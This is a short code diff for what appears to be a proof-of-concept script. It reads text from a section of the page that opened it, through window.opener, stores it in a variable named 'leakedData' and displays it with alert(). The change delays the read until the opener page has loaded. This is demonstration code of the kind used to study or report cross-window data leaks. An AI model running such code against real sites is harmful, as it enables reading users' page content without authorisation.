@@ -1,3 +1,13 @@
-var leakedData = window.opener.document.getElementsByClassName("section--2")[0].innerText
+window.opener.onload = x => {
 
-alert(leakedData)
+
+
+    var leakedData = window.opener.document.getElementsByClassName("section--2")[0].innerText
+    alert(leakedData)
+
+
+
+}
+
+
+
